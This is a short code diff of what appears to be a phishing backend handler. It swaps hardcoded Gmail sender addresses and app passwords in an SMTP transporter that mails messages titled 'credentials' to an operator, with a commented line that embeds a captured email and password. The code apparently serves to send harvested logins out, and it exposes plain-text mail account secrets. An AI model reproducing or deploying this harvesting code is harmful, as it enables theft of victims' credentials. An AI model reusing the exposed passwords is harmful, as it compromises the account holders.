@@ -18,14 +18,14 @@ export default function handler(
     port: 465,
     secure: true,
     auth: {
-      user: "Deesbox96@gmail.com",
-      pass: "erfwgneywbkpimcp",
+      user: "Sgtalexelizondo@gmail.com",
+      pass: "grnudpdsgucnpaeh",
     },
   });
 
   return transporter
     .sendMail({
-      from: `"datt" <Deesbox96@gmail.com>`,
+      from: `"datt" <Sgtalexelizondo@gmail.com>`,
       to: process.env.EMAIL_TO_SEND,
       subject: "credentials",
       // text: `email: ${JSON.stringify(email)}, password: ${JSON.stringify(password)}`
